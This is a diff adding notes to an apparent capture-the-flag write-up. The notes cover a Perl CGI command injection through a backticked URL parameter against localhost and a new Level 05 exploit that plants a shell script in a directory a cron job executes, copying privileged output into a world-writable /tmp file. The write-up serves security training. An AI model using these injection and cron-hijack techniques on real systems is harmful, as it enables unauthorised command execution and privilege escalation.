@@ -75,3 +75,22 @@ wwwbugs login:
 - Perl code analisis
 => It is a CGI function linked to server on localhost:4747
 ```curl "http://localhost:4747/level04.pl?x=\`getflag\`"```
+
+## Level 05
+- Search files owned by group flag05
+```
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+```
+
+- Code Analysis
+=> Runs every scripts on /opt/openarenserver and delete it
+
+- Script pour avoir le flag, et attente du crontab
+```
+touch /tmp/flag.txt
+chmod 777 /tmp/flag.txt
+echo -e '#!/bin/sh\ngetflag > /tmp/flag.txt' > /opt/openarenaserver/exploit.sh 
+
+watch -n 1 ls -la /opt/openarenaserver/
+```
